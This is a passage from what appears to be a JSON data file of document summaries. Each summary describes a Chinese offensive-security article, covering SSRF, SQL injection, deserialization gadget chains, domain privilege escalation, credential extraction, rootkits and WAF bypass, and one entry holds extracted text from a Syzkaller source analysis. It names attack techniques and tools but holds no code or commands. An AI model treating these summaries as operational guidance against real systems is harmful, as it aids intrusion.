        "page_content": "                    **文档主题：** 分析如下文档并完成以下任务：\n                    **文档内容：**\n                    ```\n                    1.登录 Syzkaller  源码分析（ 1 ）： syz-manager Syzkaller  源码分析（ 1 ）： syz-manager 墨晚鸢   /  2023-04-13 16:12:00  /  发表于陕⻄  /  浏览数  7501 syzkaller  是由  Google  开发的⼀个⼗分强⼤的针对内核的  fuzzer ，⾃其⾯世以来已经帮助全世界的内核安全研究员发现了数量惊⼈ 的内核漏洞 为了深⼊学习  fuzzing theory ，笔者决定先从这个⾮常经典的  kernel fuzzer  的源码进⾏分析学习   ：） 对于  syzkaller  的架构，官⽅给出了这样的⼀张  Overview syzkaller  整体上为⼀个 双机调试结构 ：由⼀台机器负责管控整个  fuzzing  流程（本⽂称为   \t Host \t ），在另⼀台机器上进⾏ fuzzing （本⽂称为   \t Guest \t ）， Guest  通常为虚拟机，从⽽能让  Host  更好地管控整个流程 syzkaller  分为三⼤组件： 位于  Host ： \t syz-manager \t   ： syzkaller  的控制中枢，其会启动多个  VM  实例（如图所示的⼀个⻩⾊卡⽚就是⼀个实例）并进⾏监 视，同时通过  RPC  来启动   \t syz-fuzzer \t 位于  Guest ： 0x00. ⼀切开始之前 PRE. ⼯作原理\t syz-fuzzer \t   ：负责引导整个  fuzz  的过程： ⽣成  input 启动   \t syz-executor \t   进程进⾏  fuzz 从被  fuzz  的  kernel  的   \t /sys/kernel/debug/kcov \t   获得覆盖（ coverage ）的相关信息 通过  RPC  将新的覆盖回送到   \t syz-manager \t \t syz-executor \t ：负责 执⾏单个输⼊ —— 从   \t syz-fuzzer \t   处接受  input  并执⾏，最后回送结果 \t syz-manager \t   为  syzkaller  的控制中枢，其会启动多个  VM  实例并进⾏监视，同时通过  RPC  来启动   \t syz-fuzzer \t ，我们通常启 动  fuzzing  时便是以   \t syz-manager \t   作为程序启动的⼊⼝点，因此笔者也先从此处开始分析 相⽐于直接开始分析源码，笔者认为有必要在此之前先列出⼀些基本的结构体，你也可以把这⼀节当成⼀个表来查   ：） Host  需要去感知与管控  Guest VMs ，因⽽在   \t syz-manager \t   当中有着⼀套相应的表示与管理  Guest VM  的结构体 \t syz-manager \t   中的  VM  实际上是使⽤⼀个名为   \t Instance \t   的结构体来表示的，定义于   \t vm/vm.go \t   中： type \t Instance \t struct \t { \t\t\t\t impl \t\t\t\t\t vmimpl . Instance \t\t\t\t workdir \t\t string \t\t\t\t timeouts \t targets . Timeouts \t\t\t\t index \t\t\t\t int \t\t\t\t onClose \t\t func () } 类似地，其需要实现   \t Interface \t   接⼝，定义于   \t vm/vmimpl/vmimpl.go \t   中： 0x01.  基本结构体 VM  管控相关 1. Instance ： VM  实例//\tInstance\t 表示⼀个单独的 \tVM. type \t Instance \t interface \t { \t\t\t\t //\tCopy\t 复制⼀个 \thostSrc\t ⽂件到 \tVM\t 中并返回 \tVM\t 中的⽂件名 . \t\t\t\t Copy ( hostSrc \t string ) \t ( string , \t error ) \t\t\t\t //\tForward\t 设置从虚拟机内到主机上给定 \ttcp\t 端⼝的转发， \t\t\t\t //\t 并返回要在虚拟机中使⽤的地址 . \t\t\t\t Forward ( port \t int ) \t ( string , \t error )\n                    ```",
        "FileName": "12424-Syzkaller 源码分析（1）：syz-manager.pdf"
    },
    {
        "page_content": "该文档探讨了服务器端请求伪造 (SSRF) 漏洞，重点介绍了利用 Gopher、DICT 和 Redis 协议以及 Curl 命令来利用 SSRF 漏洞。它还提供了 Weblogic SSRF 漏洞的示例，该漏洞可用于攻击内部 Redis 和 FastCGI 组件。",
        "FileName": "7333-结合漏洞、ssrf-lab学习SSRF漏洞.pdf"
    },
    {
        "page_content": "该文档详细介绍了 vBulletin 5.6.1 中的 SQL 注入漏洞，该漏洞允许未经授权的访问控制，导致 nodeId 未授权 SQL 注入漏洞。该漏洞影响 vBulletin 5.5.6pl1 之前的版本、5.6.0pl1 之前的 5.6.0 版本以及 5.6.1pl1 之前的 5.6.1 版本。文档提供了漏洞的详细技术分析、影响范围和修复建议。",
        "FileName": "7831-vBulletin 5.6.1 SQL注入漏洞.pdf"
    },
    {
        "page_content": "本文介绍了作者在渗透测试中通过信息收集和分析，利用目标网站的密保找回功能中的本地校验凭据漏洞，成功获取了目标网站的登录凭证，并进一步通过搜集到的信息获取了目标网站的 SFTP 配置信息，实现了对目标网站的远程访问。",
        "FileName": "9204-”传统艺能“与实战的结合 系列文章（一）放大镜下的站点.pdf"
    },
    {
        "page_content": "该文档分析了某新版本商贸系统的代码审计，重点关注其 SQL 注入漏洞。文档指出，该系统存在多个 SQL 注入点，但由于过滤不严格，攻击者可以通过构造恶意查询来绕过过滤，从而实现注入攻击。文档还提供了利用 POST 方法和盲注技术进行注入的具体示例，并分析了系统中其他潜在的漏洞，如文件上传和 Getshell 漏洞。",
        "FileName": "11190-某新版本商贸系统的代码审计.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何利用 MySQL JDBC 驱动反序列化漏洞，通过修改 MySQL 插件 rewrite_example.cc 中的 rewrite_lower 函数，将 SQL 查询语句“SHOW SESSION STATUS”重写为自定义 SQL 语句，从而控制 SQL 执行返回结果，并利用 ysoserial 的 CommonsCollections5 Gadget 执行命令。",
        "FileName": "7067-mysql jdbc 反序列化漏洞测试.pdf"
    },
    {
        "page_content": "该文档描述了一次授权渗透测试，其中利用了 KindEditor CMS 中的目录遍历漏洞。攻击者通过构造恶意 payload 访问了目标网站的 Api/Base/a 控制器方法，将 PHP 代码写入日志文件中，从而获得了目标网站的 shell 权限。",
        "FileName": "9735-一次授权的渗透测试.pdf"
    },
    {
        "page_content": "该文档主要介绍了 PHP 命名空间的概念和用法，包括命名空间的定义、子命名空间、命名空间中的元素访问、动态访问元素、常量 __NAMESPACE__ 的值、namespace 关键字、use 导⼊、全局空间、名称解析规则和调⽤回调函数。",
        "FileName": "12407-yii漏洞前置知识.pdf"
    },
    {
        "page_content": "该文档记录了对 Mini_Tmall 项目的审计过程，重点关注了登录绕过、任意文件上传和 SQL 注入漏洞。审计人员通过分析代码和数据库配置，发现了 MySQL 中启用了 ONLY_FULL_GROUP_BY 模式导致的登录错误，并通过构造绕过过滤器的 URL 和利用文件上传接口上传恶意文件来绕过权限限制。此外，审计人员还发现了两个 SQL 注入漏洞，并提供了利用方法。",
        "FileName": "12479-Mini_Tmall审计过程记录.pdf"
    },
    {
        "page_content": "XSS（跨站脚本攻击）是一种常见的Web应用程序安全漏洞，攻击者可通过嵌⼊恶意脚本代码到正常用户访问的页面中，当正常用户访问该页面时，则可导致嵌⼊的恶意脚本代码的执行，从而达到恶意攻击用户目的。XSS可分为反射型、存储型和DOM型三种，可通过分析文档对象模型（DOM）来绕过XSS过滤。",
        "FileName": "9606-谭谈 XSS 那些世人皆知的事.pdf"
    },
    {
        "page_content": "该文档分析了 Jenkins 中的 CVE-2017-1000353 漏洞，该漏洞允许远程代码执行。它深入探讨了漏洞的代码层成因，重点关注双向通信通道的建立和 ReaderThread 的启动，这些过程涉及反序列化输入，从而导致命令执行。",
        "FileName": "12716-从代码层面分析Jenkins未授权访问CVE-2017-1000353.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Java Attach 机制在 WCTF 2020 sshlyuxa 挑战中实现 RCE。通过分析 Java Attach 机制，攻击者可以动态加载恶意 Jar 包，从而在目标 JVM 上执行命令并获取 flag。",
        "FileName": "8600-由WCTF 2020 sshlyuxa 学习Java Attach机制攻击面.pdf"
    },
    {
        "page_content": "该文档分析了思科 RV345 路由器固件中的一个高危漏洞，该漏洞允许攻击者通过 upload.cgi 文件中的 fileparam 参数执行任意命令。研究人员通过解包固件、搜索关键文件和使用 Burp Suite 构造 POC，成功利用了该漏洞，并获得了路由器的 root 权限。该漏洞在固件的高版本中存在，但权限较低，只能执行简单的命令。研究人员建议在固件中应用补丁，该补丁通过正则表达式过滤特殊字符来防止命令执行漏洞。",
        "FileName": "9449-Cisco RV345路由器高危漏洞研究分享.pdf"
    },
    {
        "page_content": "该文档分析了若依后台 RCE 漏洞，该漏洞允许攻击者通过计划任务处对 \"调用目标字符串\" 的输入缺乏校验，从而执行任意命令。利用者可以生成恶意 jar 包，并通过监听 HTTP 请求让受害者访问该 jar 包，然后在若依后台添加计划任务，输入 YAML 语句调用恶意 jar 包中的方法执行命令，最终获得受害者的回连请求。",
        "FileName": "10687-某依后台RCE分析.pdf"
    },
    {
        "page_content": "本文档详细介绍了作者绕过 WAF（Web 应用程序防火墙）的曲折过程，包括后缀名绕过、内容绕过、流量绕过等技术。作者通过尝试各种方法，最终成功绕过了 WAF 的限制，实现了命令执行和文件写入。",
        "FileName": "10459-记一次曲折的WAF绕过.pdf"
    },
    {
        "page_content": "该文档主要讨论了登录逻辑漏洞，包括未授权访问、越权访问和Cookie修改等类型。它提供了具体示例，说明如何利用这些漏洞绕过身份验证并获得管理员权限。文档还提到了其他类型的逻辑漏洞，如水平越权、任意密码重置和并发问题，但没有深入探讨。",
        "FileName": "12655-逻辑漏洞合集.pdf"
    },
    {
        "page_content": "该文档分析了某 office 前台任意文件上传漏洞，该漏洞存在于 UploadFile.php 文件中，由于缺少白名单过滤，攻击者可以上传任意文件。漏洞利用代码通过构造上传表单，将文件上传到目标服务器，并通过数据库操作更新系统参数，最终实现任意文件上传。",
        "FileName": "10621-某office前台任意文件上传漏洞分析.pdf"
    },
    {
        "page_content": "本文分析了 Struts2 框架中请求和 Action 之间关联的机制，该机制基于 Java 反射实现。通过反射，Struts2 可以动态地创建 Action 类实例并调用其方法，从而处理请求。该机制涉及使用 Class.forName()、newInstance()、getMethod() 和 invoke() 等反射方法，最终实现请求和 Action 的关联。",
        "FileName": "7076-Struts2框架从请求到Action——反射机制研究.pdf"
    },
    {
        "page_content": "**主题：** ThinkPHP3.2.3 反序列化和 SQL 注入漏洞分析\n\n**内容：** 该漏洞利用 ThinkPHP3.2.3 中的 __destruct 和 __call 方法，通过反序列化触发 SQL 注入，从而实现任意文件读取。攻击者可以通过连接恶意 MySQL 服务器，读取客户端可读文件，包括 flag.txt 等敏感信息。",
        "FileName": "9441-ThinkPHP3.2.3 反序列化&sql注入漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细描述了一次内网渗透过程，从初始信息收集到最终获取域控权限。渗透者利用了Weblogic漏洞、DNS隧道和加载器加载加密的shellcode、权限维持技术和令牌窃取等手段，成功渗透了内网并获取了域控权限。",
        "FileName": "9257-一次真实内网渗透.pdf"
    },
    {
        "page_content": "该文档分析了利用 CVE-2017-8291 漏洞绕过 GhostScript 中 SAFER 的 Kimsuky 组织样本，该漏洞利用类型混淆修改栈指针，覆盖 currentdevice 对象属性，最终绕过 SAFER 保护。样本还通过 VirtualProtect() 函数注入 Shellcode 到 HimTrayIcon.exe 进程中，并通过 userinit.exe 分析系统环境，收集主机信息并发送到远程服务器。",
        "FileName": "7766-Kimsuky组织某样本分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 Egghunter 在最小的缓冲区空间内开发 KSTET 命令。它涉及识别坏字符、确定偏移量、生成 egghunter 代码、使用 MSFvenom 生成 shellcode，以及通过 STATS 命令发送 shellcode 以获得目标机的 shell 访问权限。",
        "FileName": "12290-使用Egghunter以最小的缓冲区空间开发KSTET命令.pdf"
    },
    {
        "page_content": "该文档分析了 ofCMS 代码中的安全漏洞，包括路径遍历、任意文件上传和 SQL 注入。通过全局搜索和代码审查，作者发现了这些漏洞，并提供了利用它们的示例请求。这些漏洞允许攻击者访问敏感文件、上传恶意文件和执行任意 SQL 查询。",
        "FileName": "10509-ofCMS代码审计.pdf"
    },
    {
        "page_content": "该文档分析了 WebLogic 服务器的多个常见漏洞，包括弱口令登录、XMLDecoder 反序列化、未授权访问和权限绕过。它提供了漏洞原理、复现步骤和缓解措施，强调了 WebLogic 服务器安全性的重要性。",
        "FileName": "9932-weblogic漏洞大杂烩.pdf"
    },
    {
        "page_content": "该文档分析了CVE-2012-1876漏洞，该漏洞是Internet Explorer中堆溢出漏洞，可导致远程代码执行。漏洞利用了mshtml.dll中CTableLayout::CalculateMinMax函数在循环向缓冲区写入数据时未校验控制循环次数的<col>标签span属性值，导致堆溢出。利用方法包括堆喷射、释放内存、<col>标签占位、堆溢出、越界读取虚表指针、计算mshtml.dll基址、再次堆喷射、布局ROP+Shellcode、堆溢出更改虚表指针到ROP+Shellcode地址。",
        "FileName": "9201-Internet Explorer漏洞分析(一)——CVE-2012-1876.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CVE-2019-12422 Apache Shiro RememberMe Padding Oracle 漏洞，该漏洞利用 CBC 模式的填充机制，通过枚举 IV 值来计算明文，并利用 CBC 字节翻转攻击来篡改明文。攻击者可以通过构造特定的密文，使得解密后得到指定的明文，从而在不知道密钥的情况下获取全部明文或篡改明文。",
        "FileName": "9406-CVE-2019-12422 Apache Shiro RememberMe Padding Oracle.pdf"
    },
    {
        "page_content": "该文档分析了 JavaScript 中的原型链和原型污染，重点介绍了 CVE-2019-11358 漏洞，该漏洞是 jQuery 中的一个原型污染漏洞，允许攻击者控制属性并注入对象，从而导致拒绝服务或代码执行。",
        "FileName": "11272-CVE-2019-11358分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了智能合约反编译的原理和方法，通过在线工具对智能合约的opcode进行反编译，可以得到合约的伪代码和字节码，从而分析合约的逻辑和漏洞。",
        "FileName": "8602-零时科技  智能合约安全系列文章之反编译篇.pdf"
    },
    {
        "page_content": "该文档介绍了密码重置过程中的各种安全漏洞，包括凭证泄露、接收端可控、元素弱关联、凭证未校验以及凭证可爆破或可预测。这些漏洞可能允许攻击者重置目标用户的密码，从而获得对帐户的访问权限。",
        "FileName": "8136-密码重置的那些事.pdf"
    },
    {
        "page_content": "文档探讨了软件供应链安全治理，重点关注软件物料清单 (SBOM) 在解决软件供应链安全问题中的关键作用。SBOM 提供了软件资产信息的统一描述，有助于评估风险、形成软件供应链活动中传递的信息接口标准，并提高软件透明度。",
        "FileName": "12099-SCA技术进阶系列（一）：SBOM应用实践初探.pdf"
    },
    {
        "page_content": "该文档介绍了在 Tomcat 中利用 ThreadLocal 变量实现内存马的回显技术。通过修改 ApplicationFilterChain 类的 WRAP_SAME_OBJECT 属性，可以保存请求和响应对象，从而在后续请求中注入内存马逻辑，实现远程命令执行。",
        "FileName": "11851-Tomcat回显学习第一弹.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 AspectJWeaver 中的 SimpleCache 类和 CommonCollections 中的 LazyMap 类来实现反序列化时写入文件。通过反射实例化 SimpleCache$StoreableCachingMap 对象并调用其 put 方法，可以将数据写入指定路径的文件中。而通过利用 LazyMap 的 get 方法触发 SimpleCache$StoreableCachingMap 的 put 方法，可以在反序列化过程中实现文件写入。",
        "FileName": "11499-AspectJWeaver反序列化利用链.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何通过 Active 靶场深入学习 Kerberos 协议和 Kerberoasting 攻击，包括信息收集、GPP 密码获取和解密、SPN 获取、ST 票据解密和最终获取域管理员权限的步骤。",
        "FileName": "12562-通过Active靶场深入学习kerberos协议和kerberoasting攻击.pdf"
    },
    {
        "page_content": "本文分析了 realworldctf old system 复盘（jdk1.4 getter jndi gadget）文档，该文档探讨了在 jdk1.4 版本中利用 CommonsBeanutils 库进行 JNDI 注入的攻击链。作者发现了一个新的 getter gadget，即 com.sun.jndi.ldap.LdapAttribute，其 getAttributeDefinition() 方法存在 LDAP-JNDI 注入漏洞，可用于执行远程代码执行。文档详细介绍了攻击链的原理、入口点和出口点，并提供了构造 exp 的示例代码。",
        "FileName": "9126-realworldctf old system复盘（jdk1.4 getter jndi gadget）.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 ADCS（Active Directory 证书服务）中的 NTLM 中继漏洞（ESC8）来获取域管理员权限。攻击者可以通过利用打印机漏洞强制域控制器使用机器账户发起 NTLM 认证请求，然后将请求中继到证书服务的 HTTP 接口，通过验证获得域机器账户的身份，再利用证书模板为机器用户申请证书，最后利用申请到的证书进行认证，从而获得域控制器权限。",
        "FileName": "10395-ADCS中的ntlm relay.pdf"
    },
    {
        "page_content": "本文档详细介绍了作者尝试利用 Weblogic IIOP Gadget 挖掘漏洞的经历。作者分析了 sink 点的可行性，并找到了一个 source 点，但由于缺少必要的条件，构造 payload 失败。后来，作者发现可以通过 CVE-2016-3510 将 IIOP 转换为正常流，从而绕过 t3 白名单。然而，由于缺少了一个补丁，最终挖掘失败。",
        "FileName": "11037-记一次失败的Weblogic IIOP Gadget挖掘.pdf"
    },
    {
        "page_content": "本文讨论了基于 netfilter 的 NFLOG 机制，该机制允许用户态程序通过 netlink 从内核获取数据包信息。作者认为，NFLOG 可以用于实现 rootkit 通信，因为它可以隐藏网络行为，并且比基于 AF_PACKET 的 bpf 后门更隐蔽。此外，作者还提供了基于 libnetfilter_queue 的 NFQUEUE 后门 demo 代码。",
        "FileName": "11673-基于netfilter的rootkit.pdf"
    },
    {
        "page_content": "RMI（远程方法调用）是一种机制，它允许在某个 Java 虚拟机上的对象调用另一个 Java 虚拟机中的对象上的方法。可以调用任何实现该远程接口的对象。调用这样的对象时，其参数为“marshalled”，并将其从本地虚拟机发送到远程虚拟机（该远程虚拟机的参数为“unmarshalled”）。该方法终止时，将编组来自远程机的结果并将结果发送到调用方的虚拟机。如果方法调用导致抛出异常，则该异常将指示给调用方。",
        "FileName": "12254-RMI源码浅析.pdf"
    },
    {
        "page_content": "文档探讨了 glibc2.29 中 tcache 的新增保护机制，以及如何绕过这些保护来利用 tcache 进行攻击。它重点介绍了使用 off by null 漏洞修改 chunk 大小以绕过双重释放检测的思路。",
        "FileName": "7292-tcache poisoning在glibc2.29中的利用小结.pdf"
    },
    {
        "page_content": "**主题：** Hessian2 二次反序列化中的注意事项\n\n**内容：** 本文分析了 Hessian2 中 Rome 链两次反序列化完成恶意 EvilTemplatesImpl 注入的机制，重点关注了 TemplatesImpl 的 _tfactory 属性在反序列化中的作用。此外，还介绍了 SignedObject 的用法，它可以解决 TemplatesImpl 中 _tfactory 为空的问题。",
        "FileName": "11061-关于Hessian2二次反序列化中我学到了几点.pdf"
    },
    {
        "page_content": "本文深入探讨了 Jinja2 SSti 攻击的构造方法，通过分析全局变量、全局函数和全局类，总结了构造有效 payload 的规律，并扩大了 Jinja2 SSti 的攻击面，提供了多种可利用的类和 payload，为攻击者提供了更全面的攻击手段。",
        "FileName": "11079-jinja2 ssti payload 构造的进一步探究.pdf"
    },
    {
        "page_content": "该文档分析了两个基础 CMS（bluecms 和 xhcms）的代码审计，重点关注 SQL 注入、XSS、文件包含、任意文件删除和命令执行等漏洞。它提供了每个漏洞的示例和利用方法，并强调了在代码审计中关注关键点的必要性。",
        "FileName": "11553-从多个基础CMS中入坑代码审计.pdf"
    },
    {
        "page_content": "该文档主要介绍了 CodeQL 提升篇的内容，包括编译闭源项目、历史查询、查看 AST、快速查询、获取具体 QL 类型、尽可能缩小范围、调⽤端点路径、实现接口重写方法、查询不规范导致的错误、数据流中断场景和解决方法、Partial flow、path-injection 漏洞分析等。",
        "FileName": "10852-CodeQL 提升篇.pdf"
    },
    {
        "page_content": "本文分析了 MySQL 蜜罐反制 Cobalt Strike 的原理和方法，重点介绍了利用 MySQL 的 LOAD DATA LOCAL 命令读取客户端任意文件，并伪造恶意服务器向连接到该服务器的客户端发送读取文件 payload 的过程。文章还探讨了 Navicat 连接 MySQL 时反制的条件和坑点，以及获取主机名、微信 ID、Chrome 账号和历史记录等敏感信息的方法。最后，文章提出了防护建议，包括使用开源数据库或 Navicat 免安装版本。",
        "FileName": "11631-Mysql蜜罐反制Cobalt Strike.pdf"
    },
    {
        "page_content": "本文分析了利用 CodeQL 分析和挖掘 Log4j 漏洞的方法。作者通过构建 Log4j 数据库、定义 Context 类型、寻找 Context 的 lookup 方法调用、分析 JNDI 漏洞的 source 和 sink，最终得到了多个调用链，并通过一个 Demo 验证了其中一个调用链的可行性。",
        "FileName": "10707-利用CodeQL分析并挖掘Log4j漏洞.pdf"
    },
    {
        "page_content": "DNSlog 是一种通过存储在 DNS 服务器上的域名信息来记录用户对域名访问信息的工具，可以用于在渗透测试中实现无回显信息回显，从而解决 SQL 盲注、XSS 盲打、无回显命令执行、无回显 SSRF 和无回显 XXE 等场景下的信息获取问题。",
        "FileName": "9747-如何利用DNSlog进行更高效率的无回显渗透.pdf"
    },
    {
        "page_content": "该文档介绍了利用 CVE-2021-42287 和 CVE-2021-42278 漏洞在域内进行提权的攻击方法，包括漏洞原理、手工复现、sam-the-admin 复现、impacket 工具包复现以及 CVE-2021-42287/CVE-2021-42278 工具利用等内容。",
        "FileName": "10694-CVE-2021-42287&CVE-2021-42278 域内提权.pdf"
    },
    {
        "page_content": "本文探讨了各种智能卡的安全性，包括 ID 卡、IC 卡、磁条卡、RFID 卡和 M1 卡。它解释了每种卡的结构、通信原理和安全措施。文章还讨论了 M1 卡的破解技术，并提供了提高 M1 卡安全性的建议，例如使用复杂密码、加密所有扇区以及将数据存储在数据库中。",
        "FileName": "8672-身边的智能卡安全么？——IC卡安全性初探.pdf"
    },
    {
        "page_content": "本文档详细介绍了如何改造 gadgetinspector 以自动挖掘 Fastjson gadget chain，包括分析 Fastjson 的反序列化特征、编写 Fastjson 的 SerializableDecider、ImplementationFinder 和 SourceDiscovery 组件，以及配置 Fastjson 和将其添加到配置仓库。最后，通过对 HikariCP-3.4.1.jar 的扫码挖掘结果验证了改造后的 gadgetinspector 的有效性。",
        "FileName": "7063-改造gadgetinspector篇-自动化挖掘Fastjson gadget chain.pdf"
    },
    {
        "page_content": "该文档分析了 Microsoft Exchange 中的 CVE-2021-28480 漏洞，该漏洞允许攻击者通过修改 BackendCookie 来执行服务器端请求伪造 (SSRF) 攻击。通过研究代码和修改加密 cookie，研究人员能够在未打补丁的系统上成功利用该漏洞，并通过生成令牌和使用 Exchange PowerShell 执行命令来获得对 Exchange 服务器的远程代码执行权限。",
        "FileName": "11437-Exchange CVE-2021-28480 分析复现.pdf"
    },
    {
        "page_content": "本文分析了 LLMNR 和 NetBIOS 协议的原理和漏洞，重点介绍了攻击者如何利用这些协议欺骗受害者并获取其凭证。文章还提供了防范措施，包括禁用 NetBIOS 和 LLMNR、限制出站流量和修改默认端口。",
        "FileName": "9714-LLMNR和NetBIOS欺骗攻击分析及防范.pdf"
    },
    {
        "page_content": "该文档分析了 Discuz!X 3.4 系列漏洞，包括任意文件删除、后台任意文件删除、任意文件删除配合 install 过程 getshell、全版本，版本转换功能导致 Getshell、全版本后台 Sql 注⼊等漏洞，并提供了漏洞复现环境、漏洞复现步骤、漏洞分析和修复建议。",
        "FileName": "7492-Discuz!X 3.4 系列漏洞梳理.pdf"
    },
    {
        "page_content": "CVE-2023-21768 漏洞存在于 AFD 驱动程序处理用户模式输入/输出 (I/O) 操作的方式中，允许攻击者通过恶意 IOCTL 请求执行任意代码。该漏洞利用了 AfdNotifyRemoveIoCompletion 函数中条件判断的绕过，以及 I/O Ring 机制的任意地址读写原语，最终实现任意代码执行。",
        "FileName": "12517-CVE-2023-21768 内核提权漏洞分析.pdf"
    },
    {
        "page_content": "OpenSCA 1.0.11 版本升级优化了 Java 解析逻辑，支持打印检测结果概览和报错信息到终端界面，并支持输出 Cyclonedx 和 SWID 标准格式的 SBOM 清单，同时提升了检测速度，解决了官⽅库连接受限导致的检测速度过慢问题。",
        "FileName": "12574-版本升级  v1.0.11 上线，你的需求被翻牌了吗？.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用卷影复制服务提取 Active Directory 域控制器中的 ntds.dit 文件，该文件包含域中所有用户的密码哈希值，攻击者可以利用这些哈希值执行哈希传递攻击或破解密码。文档还提供了使用 ntdsutil.exe、vssadmin、vssown.vbs 和 diskshadow.exe 等工具提取 ntds.dit 的分步说明。",
        "FileName": "9624-利用卷影拷贝服务提取ntds.dit.pdf"
    },
    {
        "page_content": "“Encrypted Pastebin”是一个加密粘贴服务，它使用AES-128加密用户数据，并使用静态密钥加密用户数据密钥。该文档详细介绍了如何利用填充oracle攻击和SQL注入来解密用户数据，并最终获得所有4个flag。",
        "FileName": "7054-Hacker101 CTF Encrypted Pastebin write-up.pdf"
    },
    {
        "page_content": "本文分析了几个分布式扫描工具的主题和内容，包括 dirsearch、Watchdog、w11scan 和 reNgine。这些工具都利用了分布式技术来提高扫描效率，并提供了各种功能，如多线程、CIDR 范围枚举、错误页面处理和强大的 fuzz 路径组合。通过分析这些工具的执行流程、设计思想和优缺点，本文为读者提供了对分布式扫描工具的深入理解。",
        "FileName": "9296-脚本小子修养之开发分布式扫描工具(一).pdf"
    },
    {
        "page_content": "该文档记录了一次对某地产集团的渗透测试，测试过程中遇到了各种阻碍，包括漏洞利用、横向移动和远程桌面连接等方面的困难。测试人员通过不断尝试和绕过安全措施，最终成功获取了目标系统的访问权限，并发现了数据库密码和弱口令等敏感信息。",
        "FileName": "12508-对某地产集团的一次渗透测试.pdf"
    },
    {
        "page_content": "该文档详细描述了渗透测试人员如何通过用户遍历、SQL 注入和命令执行漏洞，成功获取了目标公司的数据库服务器访问权限，并最终通过执行命令在服务器上获取了 Webshell。",
        "FileName": "11005-记一次无回显不出网站库分离.pdf"
    },
    {
        "page_content": "本文档探讨了基于资源的约束委派（RBCD）在域渗透中的应用。RBCD允许用户在不具有域管理员权限的情况下修改计算机帐户属性，从而可以创建具有SPN的计算机帐户，并利用这些帐户请求服务票据，进而攻击目标主机。文档提供了详细的步骤，说明如何配置RBCD、请求票据并利用它们访问目标主机，还讨论了如何绕过不可委派和受保护组成员等安全措施。",
        "FileName": "7454-域渗透——基于资源的约束委派利用.pdf"
    },
    {
        "page_content": "该文档总结了 shellcode 编写过程，包括利用工具生成、手工汇编和 shellcode 链构造等方法。其中，手工汇编和 shellcode 链构造难度较大，需要扎实的汇编基础和对 shellcode 执⾏过程的深入理解。文档还提供了具体的示例代码和分析，帮助读者理解 shellcode 编写过程。",
        "FileName": "7072-shellcode编写过程总结.pdf"
    },
    {
        "page_content": "该文档分析了两个影响 Jackson-databind 库的远程代码执行 (RCE) 漏洞 (CVE-2020-xxxx)，这些漏洞允许攻击者通过启用 enableDefaultTyping() 并使用第三方依赖项绕过黑名单类，从而在较低版本的 JDK 上执行任意命令。",
        "FileName": "8210-CVE-2020-xxxxJackson-databind RCE.pdf"
    },
    {
        "page_content": "本文档探讨了通过修改 Java 序列化过程中的 writeObject 方法来利用漏洞的技术。通过修改源代码、使用 Java Agent 技术或动态注入字节码，可以控制恶意数据并触发 JNDI 或其他漏洞利用。本文档提供了示例代码和详细的分析，说明如何利用这种技术在 CTF 题目和实际应用程序中实现漏洞利用。",
        "FileName": "11720-对writeObject流程动点手脚.pdf"
    },
    {
        "page_content": "该文档探讨了使用 Java Debug Interface (JDI) 进行自动代码审计分析的可能性，重点关注识别 API 节点入口类。作者认为，通过 JDI 直接访问目标 JVM 的类对象，可以更有效地分析路由，而无需依赖断点调试或静态分析配置。该方法允许工具获取所有类实例，包括游离对象，并搜索特定类，从而提供更全面的路由分析。",
        "FileName": "12651-JDI自动代码审计分析的可能.pdf"
    },
    {
        "page_content": "该文档分析了 Spring Cloud Gateway 中的 CVE-2022-22947 漏洞，该漏洞允许攻击者通过精心设计的过滤器和谓词在路由加载时执行任意代码。该漏洞源于对表达式语言 (SpEL) 的不当使用，攻击者可以利用它在路由加载时执行任意代码，从而导致服务器端请求伪造 (SSRF) 和远程代码执行 (RCE)。",
        "FileName": "11044-Java安全-CVE-2022-22947漏洞分析.pdf"
    },
    {
        "page_content": "本文介绍了 Chrome 浏览器中用于防止 DOM XSS 的新 API trusted-types。该 API 要求开发人员创建自定义过滤规则，以强制执行更严格的安全检查。通过 TrustedTypes.createPolicy() 方法创建 TrustedHTML 对象，可以满足 CSP 的可信要求，从而防止恶意代码执行。",
        "FileName": "7108-CSPtrusted-types 初体验.pdf"
    },
    {
        "page_content": "该文档详细介绍了在靶场环境中利用 Docker 逃逸技术获取 Ubuntu 主机的 webshell，并通过永恒之蓝漏洞和票据伪造技术横向移动到域控，最终获取域控权限。",
        "FileName": "9966-记一次docker逃逸学习.pdf"
    },
    {
        "page_content": "该文档分析了 zzzcms php 1.7.5 版本的代码审计，发现了后台寻找方法、验证码问题、前端 XSS 漏洞和登录后任意文件读取等漏洞，并提供了绕过防护的具体方法。",
        "FileName": "7239-zzzcms php 1.7.5版本代码审计初探.pdf"
    },
    {
        "page_content": "该文档记录了一位安全研究员在一天内对一个网站进行漏洞挖掘的过程。研究员通过扫描端口和目录、查看源代码、构造请求等方法，发现了未授权访问、信息泄露、SQL注入、任意文件上传和任意文件下载等漏洞。",
        "FileName": "9300-记录某一天安服仔的漏洞挖掘过程.pdf"
    },
    {
        "page_content": "Apache Commons BCEL 中的任意文件写入漏洞 (CVE-2022-42920) 允许攻击者通过向特定 API 传递攻击者可控的数据来生成任意字节码，从而在将攻击者可控的数据传递给这些 API 的应用程序中被滥用，使攻击者能够比预期更多地控制生成的字节码。该漏洞是由越界写入问题引起的，该问题存在于 ClassGen 类的 ConstantPoolGen 中，该类用于构建常量池。通过在常量数组中写入足够长的垃圾数据，然后写入恶意常量数据，攻击者可以在通过 getFinalConstantPool 方法返回对应的 ConstantPool 对象之后调用其 dump 方法从二进制流到文件流的转换中成功写入文件。",
        "FileName": "11866-CVE-2022-42920 BCEL 任意文件写漏洞.pdf"
    },
    {
        "page_content": "本文档介绍了如何识别已加入 FreeIPA 环境的 Linux 主机，以及如何在 FreeIPA 环境中使用存储在内存中的 Keytab 文件、CCACHE 票据文件和 CCACHE 票据进行身份验证。它还概述了攻击者可以滥用的错误配置和独特场景。",
        "FileName": "7868-攻击 FreeIPA 第一章：身份认证.pdf"
    },
    {
